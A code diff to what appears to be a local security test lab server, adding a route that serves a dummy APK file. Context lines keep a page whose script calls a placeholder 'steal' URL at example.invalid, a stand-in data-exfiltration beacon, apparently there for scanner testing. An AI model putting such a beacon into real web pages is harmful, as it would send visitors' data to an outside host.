@@ -34,6 +34,7 @@ export function startLab() {
          <a href="/api/data">api</a>
          <a href="/cors">cors</a>
          <a href="/admin">admin</a>
+         <a href="/downloads/app.apk">app.apk</a>
          <script src="/static/app.js"></script>`,
         { server: "FairyLab/1.0" },
       );
@@ -141,6 +142,15 @@ export function startLab() {
       res.end(`<!doctype html><html><head><title>Out</title></head><body>
         <script>fetch('http://example.invalid/steal').catch(function () {});</script>
       </body></html>`);
+      return;
+    }
+    if (path === "/downloads/app.apk") {
+      const body = Buffer.concat([Buffer.from([0x50, 0x4b, 0x03, 0x04]), Buffer.alloc(64, 0x41)]);
+      res.writeHead(200, {
+        "content-type": "application/vnd.android.package-archive",
+        "content-length": body.length,
+      });
+      res.end(body);
       return;
     }
     if (path === "/admin") {
